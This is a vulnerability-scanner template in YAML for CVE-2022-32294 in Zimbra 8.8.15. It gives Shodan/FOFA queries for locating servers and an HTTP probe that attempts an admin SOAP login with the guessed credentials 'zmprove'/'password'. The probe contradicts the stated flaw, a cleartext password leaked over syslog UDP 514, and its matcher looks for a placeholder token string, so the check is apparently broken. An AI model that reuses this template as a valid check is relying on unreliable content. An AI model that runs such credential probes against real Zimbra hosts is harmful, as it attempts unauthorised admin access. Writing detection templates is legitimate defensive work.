poc/cve/CVE-2022-32294.yaml

id: CVE-2022-32294

info:
  name: Zimbra Collaboration Open Source 8.8.15 Cleartext Password Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: Zimbra Collaboration Open Source 8.8.15 does not encrypt the initial-login randomly created password (from the "zmprove ca" command). It is visible in cleartext on port UDP 514 (aka the syslog port).
  impact: |
    High: Attackers can potentially obtain user credentials due to cleartext password storage.
  remediation: |
    Upgrade to a patched version of Zimbra Collaboration Open Source 8.8.15 or later to prevent cleartext password storage.
  reference:
    - https://github.com/soheilsamanabadi/vulnerabilitys/blob/main/Zimbra%208.8.15%20zmprove%20ca%20command
    - https://github.com/soheilsamanabadi/vulnerabilitys/pull/1
    - https://medium.com/%40soheil.samanabadi/zimbra-8-8-15-zmprove-ca-command-incorrect-access-control-8088032638e
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-32294
    cwe-id: CWE-863
    epss-score: 0.00338
    epss-percentile: 0.72102
    cpe: cpe:2.3:a:zimbra:collaboration:8.8.15:*:*:*:open_source:*:*:*
  metadata:
    vendor: zimbra
    product: collaboration
    shodan-query: http.favicon.hash:"1624375939"
    fofa-query:
      - app="zimbra-邮件系统"
      - icon_hash="1624375939"
      - icon_hash="475145467"

http:
  - method: POST
    path:
      - "{{BaseURL}}/service/extension/zimbraAdmin/soap"

    headers:
      Content-Type: application/xml

    body: |
      <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
        <soap:Header>
          <context xmlns="urn:zimbra">
            <format type="js"/>
          </context>
        </soap:Header>
        <soap:Body>
          <AdminAuthRequest xmlns="urn:zimbraAdmin">
            <name>zmprove</name>
            <password>password</password>
          </AdminAuthRequest>
        </soap:Body>
      </soap:Envelope>
    matchers:
      - type: word
        part: body
        words:
          - "<authToken>auth_token</authToken>"
